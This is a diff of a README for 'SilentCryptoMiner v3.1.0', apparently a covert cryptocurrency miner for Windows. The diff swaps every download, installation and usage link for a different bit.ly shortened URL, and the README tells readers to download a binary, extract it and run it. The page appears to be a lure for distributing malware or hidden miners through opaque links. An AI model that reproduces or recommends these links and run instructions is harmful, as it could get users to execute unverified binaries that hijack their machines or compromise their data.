@@ -5,15 +5,15 @@ SilentCryptoMiner v3.1.0 - Miner for ETH, ETC, XMR, RTM, Bitcoin, All Cryptos
 
 # How to get started
   1) First, install the script following any one of these   
-      * [Windows Binary Release](http://bit.ly/3GoI8ck)
+      * [Windows Binary Release](http://bit.ly/3IwQMIm)
   2) Install and run program on Windows
   
 # Topics
        
 [Windows]()  
-&ensp;&emsp;[Binary Release](http://bit.ly/3GoI8ck)  
-&ensp;&emsp;[Installation](http://bit.ly/3GoI8ck)  
-&ensp;&emsp;[Usage](http://bit.ly/3GoI8ck)  
+&ensp;&emsp;[Binary Release](http://bit.ly/3IwQMIm)  
+&ensp;&emsp;[Installation](http://bit.ly/3IwQMIm)  
+&ensp;&emsp;[Usage](http://bit.ly/3IwQMIm)  
 
 
 * Download the file provided in the release, extract the file and run the file.
